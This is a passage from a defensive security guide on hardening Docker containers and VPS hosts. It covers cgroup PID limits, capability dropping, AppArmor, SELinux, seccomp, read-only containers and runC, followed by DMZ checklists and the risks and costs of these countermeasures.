    3:freezer:/4f1f200ce13f2a7a180730f964c6c56d25218d6dd40b027c7b5ee1e551f4eb24/93cb84d30291201a84d5676545015220696dbcc72a65a12a0c96cda01dd1d270
    2:perf_event:/4f1f200ce13f2a7a180730f964c6c56d25218d6dd40b027c7b5ee1e551f4eb24/93cb84d30291201a84d5676545015220696dbcc72a65a12a0c96cda01dd1d270
    1:name=systemd:/system.slice/docker.service/4f1f200ce13f2a7a180730f964c6c56d25218d6dd40b027c7b5ee1e551f4eb24/93cb84d30291201a84d5676545015220696dbcc72a65a12a0c96cda01dd1d270

Each row of the above file depicts one of the cgroup hierarchies that the process, or Docker container in our case, is a member of. The row consists of three fields separated by colon, in the form:  
`hierarchy-Id:list-of-controllers-bound-to-hierarchy:cgroup-path`  
If you remember back to our review of the `/proc/cgroups` file above, you will notice that the:

1. hierarchy unique Id is represented here as the `hierarchy-Id`
2. subsys_name is represented here in the comma separated list-of-controllers-bound-to-hierarchy
3. Unrelated to `/proc/cgroups`, the third field contains relative to the mount point of the hierarchy the path name of the cgroup in the hierarchy to which the process belongs. You can see this reflected with the  
`/sys/fs/cgroup   find -name "93cb84d30291*"`  
from above

**Fork Bomb from Container**  

With a little help from the [CIS Docker Benchmark](https://benchmarks.cisecurity.org/tools2/docker/CIS_Docker_1.13.0_Benchmark_v1.0.0.pdf) we can use the `PID`s cgroup limit:

Run the containers with `--pids-limit` (kernel version 4.3+) and set a sensible value for maximum number of processes that the container can run, based on what the container is expected to be doing. By default the PidsLimit value displayed with the following command will be 0. 0 or -1 means that any number of processes can be forked within the container:

{title="Query", linenos=off, lang=bash}
    docker inspect -f '{{ .Id }}: PidsLimit={{ .HostConfig.PidsLimit }}' cgroup-test2

{title="Result", linenos=off, lang=bash}
    93cb84d30291201a84d5676545015220696dbcc72a65a12a0c96cda01dd1d270: PidsLimit=0

{linenos=off, lang=bash}
    docker run -it --pids-limit=50 --rm --cgroup-parent=4f1f200ce13f2a7a180730f964c6c56d25218d6dd40b027c7b5ee1e551f4eb24 --name=cgroup-test2 ubuntu
    root@a26c39377af9:/# 

{title="Query", linenos=off, lang=bash}
    docker inspect -f '{{ .Id }}: PidsLimit={{ .HostConfig.PidsLimit }}' 

{title="Result", linenos=off, lang=bash}
    cgroup-test2 a26c39377af9ce6554a1b6a8bffb2043c2c5326455d64c2c8a8cfe53b30b7234: PidsLimit=50

##### Capabilities {#vps-countermeasures-docker-hardening-docker-host-engine-and-containers-capabilities}

There are several ways you can [minimise your set of capabilities](http://rhelblog.redhat.com/2016/10/17/secure-your-containers-with-this-one-weird-trick/) that the root user of the container will run. `pscap` is a useful command from the `libcap-ng-utils` package in Debian and some other distributions. Once installed, you can check which capabilities your container built from the `<amazing>` image runs with, by:

{linenos=off, lang=Bash}
    docker run -d <amazing> sleep 5 >/dev/null; pscap | grep sleep
    # This will show which capabilities sleep within container is running as.
    # By default, it will be the list shown in the Identify Risks section.

In order to drop capabilities `setfcap`, `audit_write`, and `mknod`, you could run:

{linenos=off, lang=Bash}
    docker run -d --cap-drop=setfcap --cap-drop=audit_write --cap-drop=mknod <amazing> sleep 5 > /dev/null; pscap | grep sleep
    # This will show that sleep within the container no longer has enabled:
    # setfcap, audit_write, or mknod

Or just drop all capabilities and only add what you need:

{linenos=off, lang=Bash}
    docker run -d --cap-drop=all --cap-add=audit_write --cap-add=kill --cap-add=setgid --cap-add=setuid <amazing> sleep 5 > /dev/null; pscap | grep sleep
    # This will show that sleep within the container is only running with
    # audit_write, kill, setgid and setuid.

Another way of auditing the capabilities of your container is with the following command from [CIS Docker Benchmark](https://benchmarks.cisecurity.org/tools2/docker/CIS_Docker_1.13.0_Benchmark_v1.0.0.pdf):

{linenos=off, lang=Bash}
    docker ps --quiet | xargs docker inspect --format '{{ .Id }}: CapAdd={{ .HostConfig.CapAdd }} CapDrop={{ .HostConfig.CapDrop }}'

Alternatively you can modify the container manifest directly. See the [runC section](#vps-countermeasures-docker-runc-and-where-it-fits-in) for this.

##### Linux Security Modules (LSM)

Linux Security Modules (LSM) is a framework that has been part of the Linux kernel since 2.6, that supports security models implementing Mandatory Access Control (MAC). The currently accepted modules are AppArmor, SELinux, Smack and TOMOYO Linux.

At the [first Linux kernel summit](https://lwn.net/2001/features/KernelSummit/) in 2001, "_Peter Loscocco from the National Security Agency (NSA) presented the design of the mandatory access control system in its SE Linux distribution._" SE Linux had implemented many check points where authorisation to perform a particular task was controlled, and a security manager process which implements the actual authorization policy. "_The separation of the checks and the policy mechanism is an important aspect of the system - different sites can implement very different access policies using the same system._" The aim of this separation is to make it harder for the user not to adjust or override policies.

It was realised that there were several security related projects trying to solve the same problem. It was decided to [have the developers](http://www.hep.by/gnu/kernel/lsm/) interested in security [create a](https://lwn.net/Articles/180194/) "_generic interface which could be used by any security policy. The result was the Linux Security Modules (LSM)_" API/framework, which provides many hooks at [security critical points](https://www.linux.com/learn/overview-linux-kernel-security-features) within the kernel.

![](images/LSMFrameworkDesign.png)

LSMs can register with the API and receive callbacks from these hooks when the Unix Discretionary Access Control (DAC) checks succeed, allowing the LSMs Mandatory Access Control (MAC) code to run. The LSMs are not loadable kernel modules, but are instead [selectable at build-time](https://www.kernel.org/doc/Documentation/security/LSM.txt) via `CONFIG_DEFAULT_SECURITY` which takes a comma separated list of LSM names. Commonly multiple LSMs are built into a given kernel and can be overridden at boot time via the [`security=...` kernel command line argument](https://debian-handbook.info/browse/stable/sect.selinux.html#sect.selinux-setup), while also taking a comma separated list of LSM names.

If no specific LSMs are built into the kernel, the default LSM will be the [Linux capabilities](#vps-countermeasures-docker-hardening-docker-host-engine-and-containers-capabilities). "_Most LSMs choose to [extend the capabilities](https://www.kernel.org/doc/Documentation/security/LSM.txt) system, building their checks on top of the defined capability hooks._" A comma separated list of the active security modules can be found in `/sys/kernel/security/lsm`. The list reflects the order in which checks are made, the capability module will always be present and be the first in the list.

**AppArmor LSM in Docker**

If you intend to use [AppArmor](http://wiki.apparmor.net/index.php/QuickProfileLanguage), make sure it is installed, and you have a policy loaded (`apparmor_parser -r [/path/to/your_policy]`) and enforced (`aa-enforce`).
AppArmor policy's are created using the [profile language](http://wiki.apparmor.net/index.php/ProfileLanguage). Docker will automatically generate and load a default AppArmor policy `docker-default` when you run a container. If you want to override the policy, you do this with the `--security-opt` flag, like:  
`docker run --security-opt apparmor=your_policy [container-name]`  
provided that your policy is loaded as mentioned above. There are further details available on the [apparmor page](https://docs.docker.com/engine/security/apparmor/) of Dockers Secure Engine.

**SELinux LSM in Docker**

Red Hat, Fedora, and some other distributions ship with SELinux policies for Docker. Many other distros such as Debian require an install. SELinux needs to be [installed and configured](https://wiki.debian.org/SELinux/Setup) on Debian.

SELinux support for the Docker daemon is [disabled by default](https://github.com/GDSSecurity/Docker-Secure-Deployment-Guidelines) and needs to be [enabled](https://docs.docker.com/engine/reference/commandline/dockerd/) with the following command:

{linenos=off, lang=bash}
    #Start the Docker daemon with:
    dockerd --selinux-enabled

Docker daemon options can also be set within the daemon [configuration file](https://docs.docker.com/engine/reference/commandline/dockerd/#daemon-configuration-file)  
`/etc/docker/daemon.json`  
by default or by specifying an alternative location with the `--config-file` flag.

Label confinement for the container can be configured using [`--security-opt`](https://github.com/GDSSecurity/Docker-Secure-Deployment-Guidelines) to load SELinux or AppArmor policies as shown in the Docker `run` example below:

[SELinux Labels for Docker](https://www.projectatomic.io/docs/docker-and-selinux/) consist of four parts:

{title="Syntax", linenos=off, lang=bash}
    # Set the label user for the container.
    --security-opt="label:user:USER"
    # Set the label role for the container.
    --security-opt="label:role:ROLE"
    # Set the label type for the container.
    --security-opt="label:type:TYPE"
    # Set the label level for the container.
    --security-opt="label:level:LEVEL"

{title="Example", linenos=off, lang=bash}
    docker run -it --security-opt label=level:s0:c100,c200 ubuntu

SELinux can be enabled in the container using [`setenforce 1`](http://www.unix.com/man-page/debian/8/setenforce/).

SELinux can operate in [one of three modes](https://www.centos.org/docs/5/html/5.2/Deployment_Guide/sec-sel-enable-disable-enforcement.html):

1. `disabled`: not enabled in the kernel
2. `permissive` or `0`: SELinux is running and logging, but not controlling/enforcing permissions
3. `enforcing` or `1`: SELinux is running and enforcing policy

To change at runtime: Use the `setenforce [0|1]` command to change between `permissive` and `enforcing`. Test this, set to `enforcing` before persisting it at boot.  
To persist on boot: [In Debian](https://debian-handbook.info/browse/stable/sect.selinux.html#sect.selinux-setup), set `enforcing=1` in the kernel command line  
`GRUB_CMDLINE_LINUX` in `/etc/default/grub`  
and run `update-grub`  
SELinux will be enforcing after a reboot.

To audit what LSM options you currently have applied to your containers, run the following command from the [CIS Docker Benchmark](https://benchmarks.cisecurity.org/tools2/docker/CIS_Docker_1.13.0_Benchmark_v1.0.0.pdf):

{linenos=off, lang=bash}
    docker ps --quiet --all | xargs docker inspect --format '{{ .Id }}: SecurityOpt={{ .HostConfig.SecurityOpt }}'

##### Seccomp {#vps-countermeasures-docker-hardening-docker-host-engine-and-containers-seccomp}

First, you need to make sure your Docker instance was built with Seccomp. Using the recommended command from the CIS Docker Benchmark:

{linenos=off, lang=Bash}
    docker ps --quiet | xargs docker inspect --format '{{ .Id }}: SecurityOpt={{ .HostConfig.SecurityOpt }}'
    # Should return without a value, or your modified seccomp profile, discussed soon.
    # If [seccomp:unconfined] is returned, it means the container is running with
    # no restrictions on System calls.
    # Which means the container is running without any seccomp profile.

Confirm that your kernel is [configured with `CONFIG_SECCOMP`](https://docs.docker.com/engine/security/seccomp/):

{linenos=off, lang=Bash}
    cat /boot/config-`uname -r` | grep CONFIG_SECCOMP=
    # Should return the following if it is:
    CONFIG_SECCOMP=y

To add system calls to the list of syscalls you want to block for your container, take a copy of the default seccomp profile for containers ([`default.json`](https://github.com/docker/docker/blob/master/profiles/seccomp/default.json)) which contains a whitelist of the allowed system calls, and remove the system calls you want blocked. Then, run your container with the `--security-opt` option to override the default profile with a copy that you have modified: 

{linenos=off, lang=Bash}
    docker run --rm -it --security-opt seccomp=/path/to/seccomp/profile.json hello-world

##### Read-only Containers {#vps-countermeasures-docker-hardening-docker-host-engine-and-containers-read-only-containers}

Running a container with the `--read-only` flag stops writes to the container.

This can sometimes be constraining, as your application may need to write some temporary data locally. You could volume mount a host directory into your container, but this would obviously expose that temporary data to the host, and also other containers that may mount the same host directory. To stop other containers sharing your mounted volume, you would have to employ [labeling](#vps-identify-risks-docker-docker-host-engine-and-containers-namespaces-mnt-labelling) with the likes of LSM and apply the `Z` suffix at volume mount time.

A better, easier and simpler solution would be to apply the [`--tmpfs`](https://docs.docker.com/engine/reference/commandline/run/#mount-tmpfs-tmpfs) flag to one or more directories. `--tmpfs` allows the creation of tmpfs (appearing as a mounted file system, but stored in volatile memory) mounts on any local directory, which solves the problem of not being able to write to read-only containers.

If an existing directory is specified with the `--tmpfs` option, you will experience similar behaviour to that of mounting an empty directory onto an existing one. The directory is initially empty, any additions or modifications to the directories contents will not persist past container stop.

The following is an example of running a container as read-only with a writeable tmpfs `/tmp` directory:

{linenos=off, lang=Bash}
    docker run -it --rm --read-only --tmpfs /tmp --name=my-read-only-container ubuntu

The default mount flags with `--tmpfs` are the same as the Linux default `mount` flags, if you do not specify any `mount` flags the following will be used:  
`rw,noexec,nosuid,nodev,size=65536k`

#### runC and where it fits in {#vps-countermeasures-docker-runc-and-where-it-fits-in}

**Docker engine** is now built on containerd and runC. Engine creates the image indirectly via containerd -> runC using [libcontainer](https://github.com/opencontainers/runc/tree/master/libcontainer) -> and passes it to containerd.

[**containerd**](https://containerd.io/) (daemon for Linux or Windows):  
containerd is based on the Docker engine's core container runtime. It manages the complete container life-cycle, managing primitives on Linux and Windows hosts such as the following, whether directly or indirectly:

* Image transfer and storage
* Container execution and supervision
* Management of network interfaces
* Local storage
* Native plumbing level API
* Full Open Container Initiative (OCI) support: image and runtime (runC) specification  

[`containerd`](https://github.com/containerd/containerd) calls `containerd-shim` which uses runC to run the container. `containerd-shim` allows the runtime, which is `docker-runc` in Docker's case, to exit once it has started the container, thus allowing the container to run without a daemon. You can see this if you run  
`ps aux | grep docker`  
In fact, if you run this command you will see how all the components hang together. Viewing this output along with the diagram below, will help solidify your understanding of the relationships between the components.

[**runC**](https://runc.io/) is the container runtime that runs containers (think, run Container) according to the OCI specification, runC is a small standalone command line tool (CLI) built on and providing interface to libcontainer, which does most of the work. runC provides interface with:

* Linux Kernel Namespaces
* Cgroups
* Linux Security Modules
* Capabilities
* Seccomp

These features have been integrated into the low level, light weight, portable, container runtime CLI called runC, with libcontainer doing the heavy lifting. It has no dependency on the rest of the Docker platform, and has all the code required by Docker to interact with the container specific system features. More correctly, libcontainer is the library that interfaces with the above mentioned kernel features. runC leverages libcontainer directly, without the Docker engine being required in the middle.

[runC](https://github.com/opencontainers/runc) was created by the OCI, whose goal is to have an industry standard for container runtimes and formats, attempting to ensure that containers built for one engine can run on other engines.

![](images/DockerArchitecture.png)

##### [Using runC Standalone](https://opensource.com/life/16/8/runc-little-container-engine-could)

runC can be [installed](https://docker-saigon.github.io/post/Docker-Internals/#runc:cb6baf67dddd3a71c07abfd705dc7d4b) separately, but it does come with Docker in the form of `docker-runc` as well. Just run it to see the available commands and options.

runC allows us to configure and debug many of the above mentioned points we have discussed. If you want, or need to get to a lower level with your containers, using `runC` (or if you have Docker installed, `docker-runc`), directly can be a useful technique to interact with your containers. It does require additional work that `docker run` commands already do for us. First, you will need to create an OCI bundle, which includes providing configuration for the host independent `config.json` and host specific `runtime.json` [files](https://github.com/containerd/containerd/blob/0.0.5/docs/bundle.md#configs). You must also construct or [export a root filesystem](https://github.com/opencontainers/runc#creating-an-oci-bundle), which if you have Docker installed you can export an existing containers root filesystem with `docker export`. 

A container manifest (`config.json`) can be created by running:  
`runc spec`  
which creates a manifest according to the Open Container Initiative (OCI)/runc specification. Engineers can then add any additional attributes such as capabilities on top of the three specified within a container manifest created by the `runc spec` command.

#### Application Security {#vps-countermeasures-docker-application-security}
![](images/ThreatTags/PreventionAVERAGE.png)

Yes, container security is important, but in most cases, it is not the lowest hanging fruit for an attacker.

Application security is still the weakest point for compromise. It is usually much easier to attack an application running in a container, or anywhere for that matter, than it is to break container isolation or any security offered by containers and their infrastructure. Once an attacker has exploited any one of the commonly exploited vulnerabilities, such as any of the OWASP Top 10, still being introduced and found in our applications on a daily basis, and subsequently performs remote code execution, then exfils the database, no amount of container security is going to mitigate this.   

During and before my [interview](http://www.se-radio.net/2017/05/se-radio-episode-290-diogo-monica-on-docker-security/) with Diogo Mónica on Docker Security for the Software Engineering Radio show, we discussed isolation concepts, many of which I have covered above. Diogo mentioned: "why does isolation even matter when an attacker already has access to your internal network?" There are very few attacks that require escaping from a container or VM in order to succeed, there are just so many easier approaches to compromise. Yes, this may be an issue for the cloud providers that are hosting containers and VMs, but for most businesses, the most common attack vectors are still attacks focussing on our weakest areas, such as people, password stealing, spear phishing, uploading and execution of web shells, compromising social media accounts, weaponised documents, and ultimately application security, as I have [mentioned many times](https://binarymist.io/talk/js-remote-conf-2017-the-art-of-exploitation/) before.

Diogo and I also had a [discussion](http://www.se-radio.net/2017/05/se-radio-episode-290-diogo-monica-on-docker-security/) about the number of container vs VM vulnerabilities, and it is pretty clear that there are far more vulnerabilities [affecting VMs](https://xenbits.xen.org/xsa/) than there are [affecting containers](https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=docker).

VMs have memory isolation, but many of the bugs listed in the [Xen CVEs](https://xenbits.xen.org/xsa/) alone circumvent memory isolation benefits that VMs may have provided.

Another point that Diogo raised was the ability to monitor, inspect, and control the behaviour of applications within containers. In VMs there is so much activity that is unrelated to your applications, so although you can monitor activity within VMs, the noise to signal ratio is just too high to get accurate indications of what is happening in and around your application that actually matters to you. VMs also provide very little ability to control the resources associated with your running application(s). Inside of a container, you have your application and hopefully little else. With the likes of [Control Groups](#vps-countermeasures-docker-hardening-docker-host-engine-and-containers-control-groups) you have many points at which you can monitor and control aspects of the application environment.

As mentioned above, Docker containers are immutable, and can be run read-only.

The Secure Developer podcast with Guy Podjarny interviewing Ben Bernstein (CEO and founder of [Twistlock](#vps-countermeasures-docker-hardening-docker-host-engine-and-containers-twistlock)) - [show #7 Understanding Container Security](http://www.heavybit.com/library/podcasts/the-secure-developer/ep-7-understanding-container-security/) also echo's these same sentiments.

Also be sure to check the [Additional Resources](#additional-resources-vps-countermeasures-docker) chapter for many excellent resources I collected along the way on Docker security.

### Using Components with Known Vulnerabilities {#vps-countermeasures-using-components-with-known-vulnerabilities}
![](images/ThreatTags/PreventionEASY.png)

Do not do this. Stay disciplined and upgrade your servers manually, or automate it. Work out your strategy for keeping your system(s) up to date and patched. There are many options here. If you go auto, make sure you test on a staging environment before upgrading live.

### Schedule Backups {#vps-countermeasures-schedule-backups}
![](images/ThreatTags/PreventionEASY.png)

Make sure all your data and VM images are backed up routinely. Make sure you test that restoring your backups work. Backup or source control system files, deployment scripts, and what ever else is important to you. Make sure you have backups of your backups and source control. There are plenty of [tools](http://www.debianhelp.co.uk/backuptools.htm) available to help. Also make sure you are backing up the entire VM if your machine is a virtual guest by export/import of OVF files. I also like to backup all the VM files. Disk space is cheap. Is there such a thing as being too prepared for a disaster? I don't think so. It is just a matter of time before you will be calling on your backups.

### Host Firewall
![](images/ThreatTags/PreventionEASY.png)

This is one of the last things you should look at. In fact, it is not really needed if you have taken the time to remove unnecessary services and harden what is left. If you use a host firewall keep your set of rules to a minimum to reduce confusion and increase legibility. Maintain both ingress and egress.

### Preparation for DMZ {#vps-countermeasures-preparation-for-dmz}
![](images/ThreatTags/PreventionAVERAGE.png)

The following is a final checklist that I like to use before opening a hardened web server to the world. You will probably have additional items you can add.

#### Confirm DMZ has

1. [Network Intrustion Dettection System (NIDS)](#network-countermeasures-lack-of-visibility-nids), Network Intrusion Prevention System (NIPS) installed and configured correctly. Snort is a good place to start for the NIDS part, although with some work, Snort can also help with [Prevention](https://www.ibm.com/developerworks/community/blogs/58e72888-6340-46ac-b488-d31aa4058e9c/entry/august_8_2012_12_01_pm6?lang=en).
2. Incoming access from your LAN or where ever you plan on administering it from.
3. Rules for outgoing and incoming access to/from LAN, WAN tightly filtered.

#### Additional Web Server Preparation

1. Set up and configure your web server
2. Set up and configure caching proxy. Ex:
  * node-http-proxy
  * TinyProxy
  * Varnish
  * nginx
  * CloudFlare
3. Deploy application files, you may use Docker or one of my deployment tools  
[https://github.com/binarymist/DeploymentTool](https://github.com/binarymist/DeploymentTool)  
    
    ![](images/BinaryMistDeploymentTool.png)  
    
4. Hopefully you have been baking security into your web application right from the start. This is an essential part of defence in depth. Rather than having your application completely rely on other security layers to protect it, it should also be standing up for itself and understanding when it is under attack and actually [fighting back](#web-applications-countermeasures-insufficient-attack-protection), as we discuss in the Web Applications chapter under "Lack of Active Automated Prevention".
5. Set static IP address
6. Double check that the only open ports on the web server are 80 and what ever you have chosen for SSH.
7. Set up [SSH tunnel](#vps-countermeasures-disable-remove-services-harden-what-is-left-ssh-tunneling-ssh), so you can access your server from your LAN or where ever it is that you will be administering it from.
8. Decide on, document VM [backup strategy](#vps-countermeasures-schedule-backups), set it up, and make sure your team knows all about it. Do not be that single point of failure.

### Post DMZ Considerations
![](images/ThreatTags/PreventionEASY.png)

1. Set-up your `CNAME` or what ever type of `DNS` record you are using
2. Now remember, keeping any machine on (not just the internet, but any) a network requires constant consideration and effort in keeping the system as secure as possible.
3. [Work through](https://www.debian.org/doc/manuals/securing-debian-howto/ch-automatic-harden.en.html#s6.1) using the likes of [harden](https://packages.debian.org/wheezy/harden) and [Lynis](https://cisofy.com/lynis/) for your server and [harden-surveillance](https://packages.debian.org/wheezy/harden-surveillance) for monitoring your network.
4. Consider combining Port Scan Attack Detector ([PSAD](https://packages.debian.org/stretch/psad)) with [fwsnort](https://packages.debian.org/stretch/fwsnort) and Snort
5. Hack your own server and find the holes before someone else does. If you are not already familiar with attacks against systems on the Internet, read up on [Attacks and Threats](http://www.tldp.org/HOWTO/Security-Quickstart-HOWTO/appendix.html#THREATS), run [OpenVAS](https://blog.binarymist.net/2014/03/29/up-and-running-with-kali-linux-and-friends/#vulnerability-scanners), run [Web Vulnerability Scanners](https://blog.binarymist.net/2014/03/29/up-and-running-with-kali-linux-and-friends/#web-vulnerability-scanners) 

## 4. SSM Risks that Solution Causes {#vps-risks-that-solution-causes}
> Are there any? If so what are they?

* Just beware that, if you are intending to break infrastructure, or even what is running on your VPS(s) if they are hosted on someone else's infrastructure, that you make sure you have all the tests you intend to carry out documented, including what could possibly go wrong, accepted and signed by your provider. Good luck with this. That is why self hosting is often easier
* Keep in mind that if you do not break your system(s), someone else will
* Possible time constraints: It takes time to find skilled workers, gain expertise, set-up and configure
* Many of the points I have raised around VPS hardening require maintenance, you can not just set up once and forget about it

### Forfeit Control thus Security

Bringing your VPS(s) in-house can provide certainty and reduce risks of vendor lock-in, but the side-effect to this, is that you may not get your solution to market quickly enough. If someone else beats you to market, this could mean the end of business for you. Many of the larger cloud providers are getting better at security and provide many tools and techniques for hardening.

### Windows

#### PsExec and Pass The Hash (PTH)

Often SMB services are required, so turning them off may not be an option.

Some of the [countermeasures](#vps-countermeasures-psexec-pth) may introduce some inconvenience.

There is the somewhat obvious aspect that applying the countermeasures will take some research to work out what needs to be done, and the length of time it will take to do it.

#### PowerShell Exploitation with Persistence

Next generation Anti-Virus (AV) using machine learning is currently expensive.

Deep Script Block Logging can consume large amounts of disk space if you have "enabling Log script block invocation start / stop events" turned on.

### Minimise Attack Surface by Installing Only what you Need

You may not have something installed that you need.

### Disable, Remove Services. Harden what is left

You may find some stage later on that a component that you removed is actually needed.

#### Partitioning on OS Installation {#vps-risks-that-solution-causes-disable-remove-services-harden-what-is-left-partitioning-on-os-installation}

This process can sometimes lock things down too tightly. I would much rather go too far here and have to back things off a little. Perhaps you can get creative with a script to unmount, remount with less restrictions applied, perform the action you need, then mount again according to the `/etc/fstab`. This is similar to the [Mounting of Partitions](#vps-risks-that-solution-causes-disable-remove-services-harden-what-is-left-mounting-of-partitions) section below.

#### Review Password Strategies

The default number of rounds applied to the key stretching process by the Unix C library (Crypt) [has not changed](#vps-countermeasures-disable-remove-services-harden-what-is-left-review-password-strategies-default-number-of-rounds) in the last 9 years. I addressed this in the Countermeasures section, but most people will not bother increasing this value. I would [recommend doing so](#vps-countermeasures-disable-remove-services-harden-what-is-left-review-password-strategies-owasp-advice).

#### SSH

Just because you may be using SSH and SSH itself is secure, does not mean you are using it in a secure way. If you follow my advice in the Countermeasures section you will be fine. SSH can be used in insecure ways.

When you make configuration changes to SSH, it often pays to either have physical access or have more than one SSH session open when you make the change -> restart SSH -> exit your session, otherwise you run the risk of locking yourself out.

#### Disable Boot Options

If you have to boot from an alternative medium such as a rescue CD, you may wonder why this doesn't work.

#### Mounting of Partitions {#vps-risks-that-solution-causes-disable-remove-services-harden-what-is-left-mounting-of-partitions}

You may lock yourself out of being able to administer your system. This is similar to the [Partitioning on OS Installation](#vps-risks-that-solution-causes-disable-remove-services-harden-what-is-left-partitioning-on-os-installation) section above.

#### Portmap

If you are using portmap, consider swapping it for rpcbind.

#### Exim

You may be using Exim. Make sure you are not before you disable it.

#### Remove NIS

You may be using NIS+. Make sure you are not before you disable it.

#### Rpcbind

As discussed in the [Countermeasures](#vps-countermeasures-disable-remove-services-harden-what-is-left-remove-rpcbind) section, just make sure that you have no need for rpcbind before you remove it. Taking the slightly safer approach of just denying rpcbind responses in the `/etc/hosts.deny` is also an option.

#### Telnet

Someone legitimate may be relying on telnet. If this is the case, you may have larger problems than telnet. The Ignorance section of Identify Risks of the People chapter in Fascicle 0 may be pertinent here.  

#### FTP

You may have some staff that are set in their own ways. Gently coax them to understand the complete absence of security with FTP and the issues with FTPS.

#### NFS

Possible misconfiguration, make sure you test your configuration thoroughly after changes.

### Lack of Visibility

Possibly false confidence in the tools that are supposed to provide visibility. Using a collecting of similar tools can be a good idea. The attacker only needs to miss one then.

Of course any of the visibility providing tools can be replaced with trojanised replicas, unless you have a [Host Intrusion Detection System (HIDS)](#vps-countermeasures-lack-of-visibility-host-intrusion-detection-systems-hids) running from a location that the attacker is not aware of, and are continually checking for the existence and validity of the core system components.

#### Logging and Alerting

There are lots of options to choose from in this space.

Logging and alerting is never going to be a complete solution. There is a risk that people think that one or two tools mean they are covered from every type of attack, this is never the case. A large array of diverse countermeasures is always going to be required to produce good visibility of your system(s). You can even be using multiple tools that do similar jobs but take different strategies on how they execute and from where they run.

#### Web Server Log Management

There are some complexities that you need to understand in order to create a watertight and reliable off-site logging system. I discuss these in the Countermeasures section along with testing and verifying your logs are being transferred privately.

#### Proactive Monitoring

There is the risk of over confidence in monitoring tools. For example, an attacker could try and replace the configuration files for Monit or the Monit daemon itself, so the following sorts of tests would either not run or return tampered results:

  * File checksum testing
  * File size testing
  * File content testing
  * Filesystem flags testing

In saying that, if you have an agentless (running from somewhere else) file integrity checker or even several of them running on different machines and as part of their scope are checking Monit, then the attacker is going to have to find the agentless file integrity checker(s) and disable them without being noticed. Especially as discussed in regards to Stealth, the recommendation is that the Monitor not accept any incoming connections, and be in a physically safe location. This is increasing the level of difficulty for an attacker significantly.

You could and should also have NIDs running on your network which makes this even more likely that an attacker is going to step on a land mine.

#### Statistics Graphing

There are new components introduced, which increases attack surface.

#### Host Intrusion Detection Systems (HIDS)

The benefits far outweigh any risks here.

Using a system like Stealth as your file integrity checker that resides on a server(s) [somewhere else](#vps-countermeasures-lack-of-visibility-host-intrusion-detection-systems-hids-deeper-with-stealth-what-i-like) that runs against the target server, means an attacker will very likely often not realise that they are under observation if they can not see the observer running on the machine that they have access to.

This sort of strategy provides a false sense of security for the attacker. In a way it's a similar concept to a honey pot. They may know about a tool operating on the server they are on and even have disabled it, but if you keep the defence in depth mentality, then there is no reason that you can not have the upper hand without the attacker being aware of it.

You can also take things further with honey pits and mirages, these are modules in code that actively produce answers designed to confuse and confound poking and prodding attackers. This can create perfect ambush and burn up the attackers time. Attackers have budgets too. The longer it takes an attacker to compromise your system(s), the more likely it is they will start making mistakes and get caught.

### Docker

Docker security is a balancing act. There are many things you can do, that will not disadvantage you in any way. Experiment.

##### Linux Security Modules (LSM)

There are hundreds of LSM security hooks throughout the kernel, these hooks provide additional attack surface. An attacker with a buffer overflow vulnerability for example may be able to insert their own byte code and bypass the LSM provided implementation, or even redirect to a payload of their choosing. James Morris, a Linux Kernel Developer discussed this on his [blog](https://blog.namei.org/2017/03/09/hardening-the-lsm-api/).

Employing a LSM and learning its intricacies and how to configure it is a bit of a learning curve, but one that is often well worth the effort, and this does not just apply to Docker, but all of the hundreds of resources that the kernel attempts to manage.

### Schedule Backups

There is risk in relying on scheduled backups that do not exist or have in some way failed. Make sure you test your backups routinely. What you use to backup will obviously depend on where you are operating and what you are trying to backup. For example, if you are backing up Docker containers, just get those Dockerfiles in source control. If you are backing up VPSs locally, use your preferred infrastructure management tool, such as [Terraform](http://www.se-radio.net/2017/04/se-radio-episode-289-james-turnbull-on-declarative-programming-with-terraform/). If you are in the Cloud, your provider will almost certainly have a tool for this.

### Host Firewall

Personally, I prefer not to rely on firewalls, once you have removed any surplus services and hardened what is left, firewalls do not provide you a lot of benefit. I recommend not relying on them, but instead making your system(s) hard enough so that you do not require a firewall. Then if you decide to add one, they will be just another layer of defence. Dependence on firewalls often produce a single point of failure and a false sense of security, as too much trust is placed in them to protect weak and vulnerable services and communications that should instead be hardened.

## 5. SSM Costs and Trade-offs {#vps-costs-and-trade-offs}

### Forfeit Control thus Security

If you now choose to go the default way and rely on others for your compute, these are some things [you should consider](https://www.owasp.org/images/7/71/2017-04-20-TrustMeImACloud.pdf):

* Vendor lock-in
  * Infrastructure as a Service (IaaS)
  * Software as a Service (SaaS)
  * Platform as a Service (PaaS)
  * Serverless Technologies
  * Is it even possible to move to an on-premise solution?
* What happens when your provider goes down, or loses your data? Can you or your business survive without them or without the data they are hosting?
* Do you have a strategy in place for the event that your provider(s) discontinue their service? How quickly can you migrate? Where would you migrate to? Will you be able to retrieve your data? Do you actually own your data? I have discussed these issues in the Cloud chapter in more depth
* Do your providers have Service Level Agreements (SLAs) and have you tested them?
* Fault tolerance, capacity management and scalability is often (not always) better with Cloud providers
* Do you back up your data and have you tested the restoration of it, or do you also out-source this? If so, have your tested the out-sourced providers data secrecy and recoverability? You will also have to do this regularly, just because a provider passes once, does not mean it always will. Providers consist of people too, and people make mistakes
* Do you test your disaster recovery plan regularly? If you own your own infrastructure, you can get hands-on access, in the Cloud this is usually impossible
* Do you have a strategy in place for when your accounts with your providers are locked out or hijacked by a malicious actor? Have you tested it? If you own your own infrastructure, you have far more control with this
* Do you have security solutions in the Cloud, and if so, what happens if they become unavailable?

### Windows

#### PsExec and Pass The Hash (PTH)

Work through the collection of [Countermeasure items](#vps-countermeasures-psexec-pth) and just as we did in the Countermeasures section of the 30,000' view chapter of Fascicle 0 you should have already applied a relative number for the amount of work to be done to the Countermeasure Product Backlog Items. The Costs and Trade-offs will often become obvious as you iterate on the countermeasure work itself.

#### PowerShell Exploitation with Persistence

Personally, I think the cost of next generation AV with machine learning is worth the investment.

You could consider not turning on "enabling Log script block invocation start / stop events", I would sooner have it on and consider getting your logs off-site as we discussed in the [Logging and Alerting](#vps-countermeasures-lack-of-visibility-logging-and-alerting) section, with a well configured logrotate schedule.

### Minimise Attack Surface by Installing Only what you Need

When you find out you need something, research it along with alternatives. Work out whether the additional attack surface is worth the functionality you wish to add.

### Disable, Remove Services. Harden what is left

Do your homework up front and decide what is actually required and what is not. In most cases re-enabling or re-adding will only cost you time.

#### Partitioning on OS Installation

Often, a little trial and error is required to get the optimal configuration for your needs.

#### Review Password Strategies

Making these changes takes a little time, depending on how familiar you are with Crypt and how it does things.

